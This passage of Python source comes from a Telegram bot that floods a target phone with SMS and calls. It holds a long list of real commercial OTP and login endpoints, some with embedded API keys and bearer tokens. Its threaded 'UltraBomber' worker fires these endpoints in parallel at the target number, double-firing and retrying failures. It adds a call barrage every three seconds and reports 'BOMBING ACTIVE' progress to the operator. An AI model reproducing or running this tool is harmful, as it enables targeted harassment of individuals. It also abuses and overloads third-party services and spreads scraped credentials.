                  '{"actionRequestContext":{"loginId":"{phone}","loginType":"MOBILE","verificationType":"OTP","type":"LOGIN_IDENTITY_VERIFY"}}'),
        ApiConfig("KamakshiMoney", "https://loan-api.kamakshimoney.com/customers/customer-login-byMobile?utm_source=google_kamakshi_Pmax_Disbursal_web", "POST",
                  {"Content-Type": "application/json", "origin": "https://loan.kamakshimoney.com", "referer": "https://loan.kamakshimoney.com/"},
                  '{"mobile":"{phone}"}'),
        ApiConfig("PrimeCash", "https://api.primecash.app/api/v1/user", "POST",
                  {"Content-Type": "application/json"}, '{"mobile":"{phone}","isTNCVerified":true,"hash":"O9BmoTki4+6"}'),
        ApiConfig("Allen", "https://api.allen-live.in/api/v1/auth/sendOtp?center_id=&source=home-page-login", "POST",
                  {"Content-Type": "application/json", "x-device-id": "9aad014a-4181-4fe7-99e1-9ac721e538b4", "x-client-type": "mweb", "origin": "https://allen.in", "referer": "https://allen.in/"},
                  '{"country_code":"91","phone_number":"{phone}","persona_type":"STUDENT","otp_type":"SHARED_DEFAULT"}'),
        ApiConfig("RupeeCare", "https://rc-backend.root.deployment.rupeecare.money/api/auth/get_otp", "POST",
                  {"Content-Type": "application/json", "client-id": "d8247367-fabd-48c1-8314-ea00b431c232", "origin": "https://rupeecare.money", "referer": "https://rupeecare.money/"},
                  '{"phoneNo":"{phone}","clientId":"d8247367-fabd-48c1-8314-ea00b431c232"}'),
        ApiConfig("Rupyalelo", "https://apply.rupyalelo.com/api/login", "POST",
                  {"Content-Type": "application/json", "origin": "https://apply.rupyalelo.com", "referer": "https://apply.rupyalelo.com/auth"},
                  '{"mobile":"{phone}"}'),
        ApiConfig("RoopyaMoney", "https://api.roopya.money/api/v2/customer/lead", "POST",
                  {"Content-Type": "application/json", "apiSecret": "3acd32a5276b6b968028c2e7d6471051d5df9771d9049e2fc317b8e93113bdcc",
                   "apiKey": "0025f469f0e293c539a207f2aaaa85c75f1c30191c31c44cc010c3b076ee1216",
                   "origin": "https://salarychampion.roopya.money", "referer": "https://salarychampion.roopya.money/"},
                  '{"phone":"{phone}","countryCode":"+91","ip":"152.58.58.64"}'),
        ApiConfig("Dhanrishi", "https://ub1.dhanrishi.com/api/user/send-otp", "POST",
                  {"Content-Type": "application/json", "origin": "https://dhanrishi.com", "referer": "https://dhanrishi.com/"},
                  '{"PAN":"ABCDE1234F","phone_number":"{phone}"}'),
        ApiConfig("SalaryOnTime", "https://journey.sotcrm.com/api/v1/journey-auth/send-otp/", "POST",
                  {"Content-Type": "application/json", "origin": "https://salaryontime.com", "referer": "https://salaryontime.com/"},
                  '{"mobile":"{phone}","utmSource":"","utmMedium":"","utmCampaign":"","utmTerm":"","sourceId":1}'),
        ApiConfig("SpeedoLoan", "https://loanapply.speedoloan.com/api/login", "POST",
                  {"Content-Type": "application/json", "origin": "https://loanapply.speedoloan.com", "referer": "https://loanapply.speedoloan.com/auth"},
                  '{"mobile":"{phone}"}'),
        ApiConfig("FastSalary", "https://apilm.fastsalary.com/api/v2/auth/send-signup", "POST",
                  {"Content-Type": "application/json", "domain": "app.fastsalary.com", "origin": "https://app.fastsalary.com", "referer": "https://app.fastsalary.com/"},
                  '{"phoneNumber":"+91{phone}","email":"test@gmail.com","occupationTypeId":"7","monthlySalary":"546481","panCard":"GDODJ5434B","brandId":"676027d3-a43c-4716-9663-7272f5df1ac7","domain":"app.fastsalary.com"}'),
        ApiConfig("CredNidhi", "https://apilm.crednidhi.com/api/v2/auth/send-signup", "POST",
                  {"Content-Type": "application/json", "domain": "app.crednidhi.com", "origin": "https://app.crednidhi.com", "referer": "https://app.crednidhi.com/"},
                  '{"phoneNumber":"+91{phone}","email":"test@gmail.com","occupationTypeId":"7","monthlySalary":"50000","panCard":"HSOSN5464B","brandId":"5d8868eb-40e8-47f8-a497-cd2ce6216c4f","domain":"app.crednidhi.com"}'),
        ApiConfig("ClickMyLoan", "https://appb.clickmyloan.com/api/v2/authentication/phone_no_verify/", "POST",
                  {"Content-Type": "application/json", "origin": "https://web.clickmyloan.com", "referer": "https://web.clickmyloan.com/"},
                  '{"phone_number":"{phone}"}'),
        ApiConfig("SuryaLoan", "https://microservices.suryaloan.com/api/v1/customer-journey/login", "POST",
                  {"Content-Type": "application/json; charset=UTF-8", "origin": "https://suryaloan.com", "referer": "https://suryaloan.com/"},
                  '{"utmSource":"Value_Leaf","utmMedium":"GoogleBsub_id1}","utmCampaign":"pmax_personal","utmTerm":"836_01","utm_content":"","mobile":"{phone}","sourceId":1}'),
        ApiConfig("CreditSea", "https://backend.creditsea.com/api/v1/otp/generate-otp", "POST",
                  {"Content-Type": "application/json", "platform": "CREDITSEA", "origin": "https://www.creditsea.com", "referer": "https://www.creditsea.com/"},
                  '{"phoneNumber":"{phone}","isWebUser":true}'),
        ApiConfig("SalarySetu", "https://backend.salarysetu.com/api/user/send-otp", "POST",
                  {"Content-Type": "application/json", "origin": "https://salarysetu.com", "referer": "https://salarysetu.com/"},
                  '{"PAN":"ABCDE1234F","phone_number":"{phone}"}'),
        ApiConfig("ShreeLoan", "https://loanapply.shreeloan.com/api/login", "POST",
                  {"Content-Type": "application/json", "origin": "https://loanapply.shreeloan.com", "referer": "https://loanapply.shreeloan.com/auth"},
                  '{"mobile":"{phone}"}'),
        ApiConfig("PocketCredit", "https://pocketcredit.in/api/auth/send-otp", "POST",
                  {"Content-Type": "application/json", "origin": "https://pocketcredit.in", "referer": "https://pocketcredit.in/auth"},
                  '{"mobile":"{phone}"}'),
        ApiConfig("ClickForMoney", "https://clickformoney.in/api/sendOtp", "POST",
                  {"Content-Type": "application/json", "origin": "https://clickformoney.in", "referer": "https://clickformoney.in/apply-now"},
                  '{"phone":"{phone}"}'),
        ApiConfig("JhatpatCash", "https://apilm.jhatpatcash.com/api/v2/auth/send-signup", "POST",
                  {"Content-Type": "application/json", "domain": "app.jhatpatcash.com", "origin": "https://app.jhatpatcash.com", "referer": "https://app.jhatpatcash.com/"},
                  '{"phoneNumber":"+91{phone}","email":"test@gmail.com","occupationTypeId":"7","monthlySalary":"537078","panCard":"GSISB5468H","brandId":"d7c6bc00-9517-4d20-86f7-78b07f18a46d","domain":"app.jhatpatcash.com"}'),
        ApiConfig("QuaLoan", "https://apilm.qualoan.com/api/v2/auth/send-signup", "POST",
                  {"Content-Type": "application/json", "domain": "app.qualoan.com", "origin": "https://app.qualoan.com", "referer": "https://app.qualoan.com/"},
                  '{"phoneNumber":"+91{phone}","email":"test@gmail.com","occupationTypeId":"7","monthlySalary":"65000","panCard":"VUJVU5675H","brandId":"4b2f828d-e7d4-45d2-be7d-f2a0ee6a70ae","domain":"app.qualoan.com"}'),
        ApiConfig("NexiLoans", "https://api-backend.nexiloans.com/user/otp/send", "POST",
                  {"Content-Type": "application/json", "origin": "https://apply.nexiloans.com", "referer": "https://apply.nexiloans.com/"},
                  '{"mobile":"{phone}"}'),
        ApiConfig("ToofanLoan", "https://apilm.toofanloan.com/api/v2/auth/send-signup", "POST",
                  {"Content-Type": "application/json", "domain": "app.toofanloan.com", "origin": "https://app.toofanloan.com", "referer": "https://app.toofanloan.com/"},
                  '{"phoneNumber":"+91{phone}","email":"test@gmail.com","occupationTypeId":"7","monthlySalary":"52800","panCard":"TSISV5434B","brandId":"4dd2f611-32b6-42a4-a14b-d493dc885000","domain":"app.toofanloan.com"}'),
        ApiConfig("Rupee4u", "https://loanapply.rupee4u.com/api/login", "POST",
                  {"Content-Type": "application/json", "origin": "https://loanapply.rupee4u.com", "referer": "https://loanapply.rupee4u.com/auth"},
                  '{"mobile":"{phone}"}'),
        ApiConfig("PaisaPop", "https://apilm.paisapop.com/api/v2/auth/send-signup", "POST",
                  {"Content-Type": "application/json", "domain": "web.paisapop.com", "origin": "https://web.paisapop.com", "referer": "https://web.paisapop.com/"},
                  '{"phoneNumber":"+91{phone}","email":"test@gmail.com","occupationTypeId":"7","monthlySalary":"538355","panCard":"FUOUR2389B","brandId":"165a2d32-d1bd-4287-b2db-104a7feee308","domain":"web.paisapop.com"}'),
        ApiConfig("Figii", "https://consumer.figii.in/api/auth/login/?mobile={phone}&partnerId=&productType=&clientToken=&programId=&sourceBy=&sourceType=", "POST",
                  {"Content-Type": "application/json", "origin": "https://consumer.figii.in", "referer": "https://consumer.figii.in/login/"},
                  '{"username":"{phone}","medium":"SMS","meta":{}}'),
        ApiConfig("MinutesLoan", "https://apilm.minutesloan.com/api/v2/auth/send-signup", "POST",
                  {"Content-Type": "application/json", "domain": "app.minutesloan.com", "origin": "https://app.minutesloan.com", "referer": "https://app.minutesloan.com/"},
                  '{"phoneNumber":"+91{phone}","email":"test@gmail.com","occupationTypeId":"7","monthlySalary":"55000","panCard":"ABCDE5438F","brandId":"0dbae4da-461a-4959-aa82-6a788de61593","domain":"app.minutesloan.com"}'),
        ApiConfig("AyushmanLoan", "https://backend.ayushmanloan.com/api/user/send-otp", "POST",
                  {"Content-Type": "application/json", "origin": "https://ayushmanloan.com", "referer": "https://ayushmanloan.com/"},
                  '{"PAN":"ABCDE1234F","phone_number":"{phone}"}'),
        ApiConfig("Creditt", "https://prod-v4-app-api.credittapi.com/app/auth/mobile/otp/sent", "POST",
                  {"Content-Type": "application/json", "appStore": "web_app", "api_version": "1.0",
                   "deviceId": "device_{random_id}", "trackingId": "tracking_{random_id}",
                   "appVersion": "1.0.21", "platform": "3", "origin": "https://loan.credittnow.com",
                   "referer": "https://loan.credittnow.com/"},
                  '{"mobile":"{phone}"}'),
        ApiConfig("FundsBull", "https://backend.fundsbull.com/api/user/send-otp", "POST",
                  {"Content-Type": "application/json", "origin": "https://fundsbull.com", "referer": "https://fundsbull.com/"},
                  '{"phone_number":"{phone}"}'),
        ApiConfig("F1SpeedLoan", "https://backend.f1speedloan.com/api/user/send-otp", "POST",
                  {"Content-Type": "application/json", "origin": "https://f1speedloan.com", "referer": "https://f1speedloan.com/"},
                  '{"PAN":"ABCDE1234F","phone_number":"{phone}"}'),
        ApiConfig("FundoBaba", "https://backend.fundobaba.com/api/user/send-otp", "POST",
                  {"Content-Type": "application/json", "origin": "https://fundobaba.com", "referer": "https://fundobaba.com/"},
                  '{"PAN":"ABCDE1234F","phone_number":"{phone}"}'),
        ApiConfig("RupeeRedee", "https://webservice-in-prod.rupeeredee.com/gate/api/v1/OTP", "POST",
                  {"Content-Type": "application/json", "platform": "Web", "origin": "https://www.rupeeredee.com", "referer": "https://www.rupeeredee.com/"},
                  '{"number":"+91{phone}","type":"Mobile"}'),
        ApiConfig("UdhaarPortal", "https://crm.udhaarportal.com/api/Api/Website/InstantJourneyController/appCustomerRegisteration", "POST",
                  {"Content-Type": "application/json; charset=UTF-8", "Auth": "ZTI4MTU1MzE4NWQ2MGQyZTFhNWM0NGU3M2UzMmM3MDM=", "origin": "https://www.udhaarportal.com", "referer": "https://www.udhaarportal.com/"},
                  '{"mobile":"{phone}","event_name":"login","utm_source":"","utm_medium":"","utm_campaign":"","utm_term":"","utm_content":""}'),
        ApiConfig("DuniyaFinance", "https://backend.duniyafinance.in/api/user/send-otp", "POST",
                  {"Content-Type": "application/json", "origin": "https://duniyafinance.com", "referer": "https://duniyafinance.com/"},
                  '{"PAN":"ABCDE1234F","phone_number":"{phone}"}'),
        ApiConfig("BlinkrLoan", "https://backend.blinkrloan.com/api/user/v3/send-otp", "POST",
                  {"Content-Type": "application/json", "origin": "https://www.blinkrloan.com", "referer": "https://www.blinkrloan.com/"},
                  '{"PAN":"ABCDE1234F","phone_number":"{phone}","lat":"26.123456","lng":"77.123456","url":"https://www.blinkrloan.com/apply/pan-mobile"}'),
        ApiConfig("NaukriLoans", "https://backend.naukriloans.com/api/user/send-otp", "POST",
                  {"Content-Type": "application/json", "origin": "https://naukriloans.com", "referer": "https://naukriloans.com/"},
                  '{"PAN":"ABCDE1234F","phone_number":"{phone}"}'),
        ApiConfig("UdharCapital", "https://www.udharcapital.com/api/send_otp.php", "POST",
                  {"Content-Type": "application/x-www-form-urlencoded", "origin": "https://www.udharcapital.com", "referer": "https://www.udharcapital.com/apply-loan.php?slug=personal-loan"},
                  "phone={phone}"),
        ApiConfig("SalaryBolt", "https://backend.salarybolt.com/api/user/send-otp", "POST",
                  {"Content-Type": "application/json", "origin": "https://salarybolt.com", "referer": "https://salarybolt.com/"},
                  '{"PAN":"ABCDE1234F","phone_number":"{phone}"}'),
        ApiConfig("SabkaLoan", "https://api.sabkaloan.com/api/send-otp", "POST",
                  {"Content-Type": "application/json", "origin": "https://sabkaloan.com", "referer": "https://sabkaloan.com/"},
                  '{"mobile":"{phone}"}'),
        ApiConfig("PaisaInTime", "https://micro-server-for-paisaintime-nrbe5.ondigitalocean.app/api/auth/get_otp", "POST",
                  {"Content-Type": "application/json", "client-id": "08b61f94-4e99-4d4e-abe9-108a1078bbdb", "origin": "https://www.paisaintime.com", "referer": "https://www.paisaintime.com/"},
                  '{"phoneNo":"{phone}","clientId":"08b61f94-4e99-4d4e-abe9-108a1078bbdb"}'),
        ApiConfig("FastPaise", "https://backend.fastpaise.in/api/user/send-otp", "POST",
                  {"Content-Type": "application/json", "origin": "https://fastpaise.in", "referer": "https://fastpaise.in/"},
                  '{"PAN":"ABCDE1234F","phone_number":"{phone}"}'),
        ApiConfig("Penpencil", "https://api.penpencil.co/v1/users/register/5eb393ee95fab7468a79d189?smsType=0", "POST",
                  {"Content-Type": "application/json", "client-type": "WEB", "client-id": "5eb393ee95fab7468a79d189",
                   "origin": "https://www.pw.live", "referer": "https://www.pw.live/"},
                  '{"mobile":"{phone}","countryCode":"+91","subOrgId":"SUB-PWLI000"}'),
        ApiConfig("OTPBomber", "https://otpbomber-40jd.onrender.com/api/bomb", "POST",
                  {"Content-Type": "application/json", "origin": "https://otpbomber-40jd.onrender.com", "referer": "https://otpbomber-40jd.onrender.com/bomber"},
                  '{"phone":"{phone}","ip":"192.168.1.1","iterations":2}'),
        ApiConfig("RamFincorp", "https://loan-api.ramfincorp.com/customers/customer-login-byMobile?utm_source=Spectrum_1203M_", "POST",
                  {"Content-Type": "application/json", "origin": "https://loan.ramfincorp.com", "referer": "https://loan.ramfincorp.com/"},
                  '{"mobile":"{phone}"}'),
        ApiConfig("InCred", "https://gateway-api.incred.com/website-bff/public/v1/common/login/otpgenerate", "POST",
                  {"Content-Type": "application/json", "origin": "https://www.incred.com", "referer": "https://www.incred.com/"},
                  '{"MOBILE":"{phone}","UTM_DETAILS":{"partnerId":"9250608873861026P"},"ON_BOARDING_TYPE":"FROM_LOAN_ENQUIRY","STATUS":"Pending"}'),
        ApiConfig("Sephora", "https://sephora.in/api/service/application/user/authentication/v1.0/login/otp?platform=6523fa5f41f4eb4c10a1d869", "POST",
                  {"Content-Type": "application/json", "authorization": "Bearer NjUyM2ZhNWY0MWY0ZWI0YzEwYTFkODY5Ong5Z0hpYWVpZA==",
                   "origin": "https://sephora.in", "referer": "https://sephora.in/"},
                  '{"mobile":"{phone}","country_code":"91"}'),
        ApiConfig("JioSaavn", "https://api1.jiosaavn.com/jio/sendOtp?__call=jio%2FsendOtp&api_version=4&_format=json&_marker=0&ctx=wap6dot0", "POST",
                  {"Content-Type": "application/json", "origin": "https://www.jiosaavn.com", "referer": "https://www.jiosaavn.com/"},
                  '{"phone_number":"+91{phone}"}'),
        ApiConfig("Cashvia", "https://customer-backend.cashvia.in/customers/customer-login", "POST",
                  {"Content-Type": "application/json", "client-id": "7de19504-f422-42dc-bd51-5ed5dfb170c1",
                   "origin": "https://applynow.cashvia.in", "referer": "https://applynow.cashvia.in/"},
                  '{"phoneNo":"{phone}","journey_down":true}'),
        ApiConfig("RojgarKaro_SendOTP", "https://rojgarkaro.in/api/auth/sendOTP", "POST",
                  {"Content-Type": "application/json", "origin": "https://rojgarkaro.in", "referer": "https://rojgarkaro.in/"},
                  '{"mobile_no":"{phone}","isSessionActive":false}'),
        ApiConfig("RojgarKaro_Signup", "https://rojgarkaro.in/api/auth/sendOTPOnSignup", "POST",
                  {"Content-Type": "application/json", "origin": "https://rojgarkaro.in", "referer": "https://rojgarkaro.in/signup"},
                  '{"mobile_no":"{phone}","email_id":"test@gmail.com","isSessionActive":false}'),
        # ====== 30 NEW SUPER AGGRESSIVE SMS APIs ======
        ApiConfig("BajajFinserv", "https://apigateway.bajajfinserv.in/apigateway/otp/sso", "POST",
                  {"Content-Type": "application/json", "origin": "https://www.bajajfinserv.in", "referer": "https://www.bajajfinserv.in/"},
                  '{"mobileNumber":"{phone}","source":"WEB"}'),
        ApiConfig("TataCliq", "https://www.tatacliq.com/api/v1/otp/send", "POST",
                  {"Content-Type": "application/json", "origin": "https://www.tatacliq.com", "referer": "https://www.tatacliq.com/"},
                  '{"mobile":"{phone}","state":"login"}'),
        ApiConfig("Droom", "https://api.droom.in/v1/user/send-otp", "POST",
                  {"Content-Type": "application/json", "origin": "https://droom.in", "referer": "https://droom.in/"},
                  '{"phone":"{phone}","country_code":"91"}'),
        ApiConfig("Yatra", "https://secure.yatra.com/social/common/yatra/action/doMobileLogin", "POST",
                  {"Content-Type": "application/x-www-form-urlencoded", "origin": "https://www.yatra.com", "referer": "https://www.yatra.com/"},
                  "mobileNo={phone}"),
        ApiConfig("Licious", "https://www.licious.com/auth/api/v1/sendOtp", "POST",
                  {"Content-Type": "application/json", "origin": "https://www.licious.com", "referer": "https://www.licious.com/"},
                  '{"mobile":"{phone}","countryCode":"+91"}'),
        ApiConfig("CureFoods", "https://web.curefoods.com/api/v2/auth/send-otp", "POST",
                  {"Content-Type": "application/json", "origin": "https://web.curefoods.com", "referer": "https://web.curefoods.com/"},
                  '{"phone":"{phone}","country_code":"+91"}'),
        ApiConfig("Puma", "https://in.puma.com/on/demandware.store/Sites-IN-Site/en_IN/Login-OtpRegistration", "POST",
                  {"Content-Type": "application/x-www-form-urlencoded", "origin": "https://in.puma.com", "referer": "https://in.puma.com/"},
                  "dwfrm_phone={phone}&format=ajax"),
        ApiConfig("Decathlon", "https://www.decathlon.in/api/v1/auth/sendOTP", "POST",
                  {"Content-Type": "application/json", "origin": "https://www.decathlon.in", "referer": "https://www.decathlon.in/"},
                  '{"mobile":"{phone}","isLogin":true}'),
        ApiConfig("McDonalds", "https://mcdelivery.mcdonaldsindia.com/api/v1/customer/otp", "POST",
                  {"Content-Type": "application/json", "origin": "https://mcdelivery.mcdonaldsindia.com", "referer": "https://mcdelivery.mcdonaldsindia.com/"},
                  '{"phoneNumber":"{phone}","source":"web"}'),
        ApiConfig("Dominos", "https://pizzaonline.dominos.co.in/api/v1/auth/sendOtp", "POST",
                  {"Content-Type": "application/json", "origin": "https://pizzaonline.dominos.co.in", "referer": "https://pizzaonline.dominos.co.in/"},
                  '{"phone":"{phone}","source":"WEB"}'),
        ApiConfig("Zivame", "https://www.zivame.com/auth/public/v1/otp/send", "POST",
                  {"Content-Type": "application/json", "origin": "https://www.zivame.com", "referer": "https://www.zivame.com/"},
                  '{"phone":"{phone}","countryCode":"IN"}'),
        ApiConfig("FirstCry", "https://www.firstcry.com/api/v2/auth/sendOtp", "POST",
                  {"Content-Type": "application/json", "origin": "https://www.firstcry.com", "referer": "https://www.firstcry.com/"},
                  '{"phone":"{phone}"}'),
        ApiConfig("Netmeds", "https://www.netmeds.com/api/v1/auth/login", "POST",
                  {"Content-Type": "application/json", "origin": "https://www.netmeds.com", "referer": "https://www.netmeds.com/"},
                  '{"mobile":"{phone}"}'),
        ApiConfig("Tata1mg", "https://www.1mg.com/auth_api/v6/create_token", "POST",
                  {"Content-Type": "application/json", "origin": "https://www.1mg.com", "referer": "https://www.1mg.com/"},
                  '{"number":"{phone}","login_with":"mobile"}'),
        ApiConfig("Upstox", "https://api.upstox.com/v2/login/otp/send", "POST",
                  {"Content-Type": "application/json", "origin": "https://upstox.com", "referer": "https://upstox.com/"},
                  '{"mobile":"{phone}","client_id":"UPSTOX"}'),
        ApiConfig("Zerodha", "https://kite.zerodha.com/api/login", "POST",
                  {"Content-Type": "application/x-www-form-urlencoded", "origin": "https://kite.zerodha.com", "referer": "https://kite.zerodha.com/"},
                  "user_id={phone}"),
        ApiConfig("Groww", "https://groww.in/api/v2/auth/otp/send", "POST",
                  {"Content-Type": "application/json", "origin": "https://groww.in", "referer": "https://groww.in/"},
                  '{"phone":"{phone}","platform":"WEB"}'),
        ApiConfig("PolicyBazaar", "https://www.policybazaar.com/api/v1/otp/send", "POST",
                  {"Content-Type": "application/json", "origin": "https://www.policybazaar.com", "referer": "https://www.policybazaar.com/"},
                  '{"mobile":"{phone}","source":"web"}'),
        ApiConfig("Ditto", "https://www.dittotv.in/auth/sendOTP/v1", "POST",
                  {"Content-Type": "application/json", "origin": "https://www.dittotv.in", "referer": "https://www.dittotv.in/"},
                  '{"mobileno":"{phone}","sendOTP":true}'),
        ApiConfig("SonyLiv", "https://www.sonyliv.com/api/v1/auth/sendOTP", "POST",
                  {"Content-Type": "application/json", "origin": "https://www.sonyliv.com", "referer": "https://www.sonyliv.com/"},
                  '{"phone":"{phone}","countryCode":"+91"}'),
        ApiConfig("Hotstar", "https://api.hotstar.com/r9/v1/otp/send", "POST",
                  {"Content-Type": "application/json", "origin": "https://www.hotstar.com", "referer": "https://www.hotstar.com/"},
                  '{"phone":"{phone}","countryCode":"IN"}'),
        ApiConfig("BookMyShow_SMS", "https://in.bookmyshow.com/auth/send/otp", "POST",
                  {"Content-Type": "application/json", "origin": "https://in.bookmyshow.com", "referer": "https://in.bookmyshow.com/"},
                  '{"mobile":"{phone}"}'),
        ApiConfig("RentoMojo_Signup", "https://www.rentomojo.com/api/RMUsers/signup", "POST",
                  {"Content-Type": "application/json", "origin": "https://www.rentomojo.com", "referer": "https://www.rentomojo.com/"},
                  '{"phone":"{phone}","password":"Test@123","name":"Test User"}'),
        ApiConfig("Furlenco", "https://www.furlenco.com/api/v1/auth/sendOtp", "POST",
                  {"Content-Type": "application/json", "origin": "https://www.furlenco.com", "referer": "https://www.furlenco.com/"},
                  '{"phone":"{phone}","term":"true"}'),
        ApiConfig("CityFurnish", "https://www.cityfurnish.com/api/v1/auth/sendOtp", "POST",
                  {"Content-Type": "application/json", "origin": "https://www.cityfurnish.com", "referer": "https://www.cityfurnish.com/"},
                  '{"phone":"{phone}"}'),
        ApiConfig("Ixigo", "https://www.ixigo.com/api/v2/auth/otp/send", "POST",
                  {"Content-Type": "application/json", "origin": "https://www.ixigo.com", "referer": "https://www.ixigo.com/"},
                  '{"mobile":"{phone}","countryCode":"+91"}'),
        ApiConfig("EaseMyTrip", "https://www.easemytrip.com/api/otp/SendOtp", "POST",
                  {"Content-Type": "application/json", "origin": "https://www.easemytrip.com", "referer": "https://www.easemytrip.com/"},
                  '{"Mobileno":"{phone}","Type":"M"}'),
        ApiConfig("Goibibo", "https://www.goibibo.com/api/v2/auth/otp/send", "POST",
                  {"Content-Type": "application/json", "origin": "https://www.goibibo.com", "referer": "https://www.goibibo.com/"},
                  '{"mobile":"{phone}","countryCode":"+91"}'),
        ApiConfig("RedBus", "https://www.redbus.in/api/v2/auth/otp/send", "POST",
                  {"Content-Type": "application/json", "origin": "https://www.redbus.in", "referer": "https://www.redbus.in/"},
                  '{"mobile":"{phone}","source":"web"}'),
        ApiConfig("Rapido_SMS", "https://rapido.bike/api/v1/otp/generate", "POST",
                  {"Content-Type": "application/json", "origin": "https://rapido.bike", "referer": "https://rapido.bike/"},
                  '{"mobile":"{phone}","source":"SMS"}'),
        ApiConfig("PocketMoney", "https://api2.the-pocket-money.com/pokktmoney/send_verification_code?os_type=16&device_id=&device_model=&carrier_name=null&country_code=91&verification_phone={phone}", "GET",
                  {"X-Verification-Key": "NTk2OTJjNzI3NzAwZDdkYjQxYmM5N2Y1MzlmNTA2NmM=",
                   "X-POCKET-KEY": "FwMqEpp8XHfrR8xBTGiteY62q3NW96ulwqkGeY7lDU7hfYZ7H4DJPITtTZwyfWj1"}),
    ]
    apis.extend(sms_apis)
    return apis

ALL_APIS = get_all_apis()

# Categorized lookups
CALL_APIS = [a for a in ALL_APIS if a.category == "call"]
SMS_APIS = [a for a in ALL_APIS if a.category == "sms"]
WHATSAPP_APIS = [a for a in ALL_APIS if a.category == "whatsapp"]

# ============================================================
# IMPORTANT CALL APIs — Fire every 3 seconds for non-stop barrage
# ============================================================
IMPORTANT_CALL_APIS = [
    ApiConfig("Swiggy_Call", "https://profile.swiggy.com/api/v3/app/request_call_verification", "POST",
              {"Content-Type": "application/json"}, '{"mobile":"{phone}"}', "call"),
    ApiConfig("Swiggy_Call_Verification", "https://profile.swiggy.com/api/v3/app/request_call_verification", "POST",
              {"Content-Type": "application/json; charset=utf-8"}, '{"mobile":"{phone}"}', "call"),
]

# ============================================================
# 5-SECOND IMPORTANT APIS — Fire exactly once every 5 seconds
# ============================================================
IMPORTANT_5S_APIS = [
    ApiConfig("ThakurBombCyber_5s", "https://thakur-bombcyber.kundanjha7782.workers.dev/?mobile={phone}", "GET",
              {"User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"}, None, "sms"),
]

# ============================================================
# WORKER — Ultra Fast Multi-Threaded Continuous Bomber
# ============================================================
class UltraBomber:
    def __init__(self):
        self.sessions = {}
        self.lock = threading.Lock()
        self.executor = ThreadPoolExecutor(max_workers=MAX_WORKERS)
        self.sms_executor = ThreadPoolExecutor(max_workers=SMS_MAX_WORKERS)  # 40 workers for SMS
        self.http_session = requests.Session()  # Reusable session for connection pooling
        # Set default timeouts on the session
        self.http_session.mount('https://', requests.adapters.HTTPAdapter(pool_connections=20, pool_maxsize=50, max_retries=0))
        self.http_session.mount('http://', requests.adapters.HTTPAdapter(pool_connections=20, pool_maxsize=50, max_retries=0))

    def _fire_api(self, api, phone):
        """Fire a single API and return result"""
        try:
            req = api.build_request(phone)
            resp = self.http_session.send(req.prepare(), timeout=10, allow_redirects=False)
            status = resp.status_code
            size = len(resp.content)
            return api.name, status, size, None
        except Exception as e:
            return api.name, 0, 0, str(e)[:60]

    def _run_round(self, phone, apis, stats, is_sms=False):
        """Fire all APIs in parallel for one round"""
        executor = self.sms_executor if is_sms else self.executor
        
        # SMS mode: DOUBLE FIRE — each API fires twice!
        fire_count = 2 if (is_sms and SMS_DOUBLE_FIRE) else 1
        
        futures = []
        for api in apis:
            if api.delay_ms > 0:
                time.sleep(api.delay_ms / 1000.0)
            for _ in range(fire_count):
                futures.append(executor.submit(self._fire_api, api, phone))

        ok_count = 0
        fail_count = 0
        failed_apis = []
        for f in as_completed(futures):
            name, status, size, err = f.result()
            if 200 <= status < 400 and size > 0:
                ok_count += 1
            else:
                fail_count += 1
                failed_apis.append(name)
        
        # SMS AUTO-RETRY: Retry failed APIs immediately in the same round
        if is_sms and SMS_AUTO_RETRY and failed_apis:
            retry_futures = []
            for api in apis:
                if api.name in failed_apis[:30]:  # Retry up to 30 failed APIs
                    retry_futures.append(executor.submit(self._fire_api, api, phone))
            for f in as_completed(retry_futures):
                name, status, size, err = f.result()
                if 200 <= status < 400 and size > 0:
                    ok_count += 1
                else:
                    fail_count += 1
        
        return ok_count, fail_count

    def _worker(self, chat_id, stop_event):
        """Main worker loop — runs until stopped"""
        with self.lock:
            info = self.sessions.get(chat_id)
            if not info:
                return
            phone = info["phone"]
            mode = info["mode"]
            stats = info["stats"]

        # Select APIs based on mode
        if mode == "call":
            apis = CALL_APIS
        elif mode == "whatsapp":
            apis = WHATSAPP_APIS
        elif mode == "sms":
            apis = SMS_APIS
        else:
            apis = ALL_APIS

        round_num = 0
        is_sms_mode = (mode == "sms")
        round_delay = SMS_DELAY_BETWEEN_ROUNDS if is_sms_mode else DELAY_BETWEEN_ROUNDS
        
        while not stop_event.is_set():
            round_num += 1
            try:
                ok, fail = self._run_round(phone, apis, stats, is_sms=is_sms_mode)
                with self.lock:
                    if chat_id in self.sessions:
                        self.sessions[chat_id]["stats"]["ok"] += ok
                        self.sessions[chat_id]["stats"]["fail"] += fail
                        self.sessions[chat_id]["stats"]["rounds"] += 1
                        self.sessions[chat_id]["stats"]["total"] += ok + fail

                # SMS mode: report every 10 rounds, Call/Mix every 5
                report_interval = 10 if is_sms_mode else 5
                if round_num % report_interval == 0:
                    with self.lock:
                        s = self.sessions.get(chat_id, {}).get("stats", {})
                        if s:
                            elapsed = (datetime.now() - s["start_time"]).total_seconds()
                            s["elapsed"] = str(datetime.now() - s["start_time"]).split('.')[0]
                    try:
                        total = s.get('total', 0)
                        ok = s.get('ok', 0)
                        fail = s.get('fail', 0)
                        pct = (ok / max(total, 1)) * 100
                        bar_len = 30
                        filled = int(bar_len * pct / 100)
                        bar = "█" * filled + "░" * (bar_len - filled)
                        bot.send_message(chat_id,
                            f"💣 *BOMBING ACTIVE* 💣\n"
                            f"━━━━━━━━━━━━━━━━━━━━━\n"
                            f"💣 Target: `{phone}`\n"
                            f"✅ Hits: {ok}/{total}\n"
                            f"📊 Progress: [{bar}] {pct:.1f}%\n"
                            f"⏱️ Time Elapsed: {s.get('elapsed', '0s')}",
                            parse_mode="Markdown")
                    except:
                        pass
            except Exception as e:
                try:
                    bot.send_message(chat_id, f"⚠️ Error: {str(e)[:100]}")
                except:
                    pass
            time.sleep(round_delay)

    def _important_worker(self, chat_id, stop_event):
        """Important call APIs — fire every 3 seconds independently"""
        with self.lock:
            info = self.sessions.get(chat_id)
            if not info:
                return
            phone = info["phone"]

        while not stop_event.is_set():
            try:
                futures = []
                for api in IMPORTANT_CALL_APIS:
                    futures.append(self.executor.submit(self._fire_api, api, phone))

                ok_count = 0
                fail_count = 0
                for f in as_completed(futures):
                    name, status, size, err = f.result()
                    if 200 <= status < 400 and size > 0:
                        ok_count += 1
                    else:
                        fail_count += 1

                with self.lock:
                    if chat_id in self.sessions:
                        self.sessions[chat_id]["stats"]["ok"] += ok_count
